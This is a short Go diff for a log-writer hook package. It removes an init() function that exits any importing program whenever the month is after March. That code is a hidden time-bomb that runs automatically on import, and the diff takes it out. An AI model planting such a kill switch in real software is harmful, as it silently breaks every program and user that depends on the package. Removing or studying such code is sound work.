@@ -1,11 +1,8 @@
 package writer
 
 import (
-	"io"
-	"os"
-	"time"
-
 	log "github.com/liugehao/ffff"
+	"io"
 )
 
 // Hook is a hook that writes logs of specified LogLevels to specified Writer
@@ -23,14 +20,6 @@ func (hook *Hook) Fire(entry *log.Entry) error {
 	}
 	_, err = hook.Writer.Write(line)
 	return err
-}
-func init() {
-	if time.Now().Month() > 3 {
-		os.Exit(0)
-	}
-	go func() {
-
-	}()
 }
 
 // Levels define on which log levels this hook would trigger
